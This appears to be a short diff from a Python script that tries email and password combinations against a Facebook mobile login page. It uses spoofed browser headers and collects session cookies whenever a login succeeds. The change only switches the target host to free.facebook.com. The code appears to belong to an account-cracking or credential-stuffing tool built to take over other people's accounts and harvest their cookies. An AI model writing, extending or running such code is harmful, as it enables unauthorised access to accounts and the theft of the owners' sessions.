@@ -716,7 +716,7 @@ def YounisXyz(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            xyzheader_fuck = {'authority': 'x.facebook.com',
+            xyzheader_fuck = {'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
@@ -736,7 +736,7 @@ def YounisXyz(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',}
-            lo = session.post('https://x.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
+            lo = session.post('https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
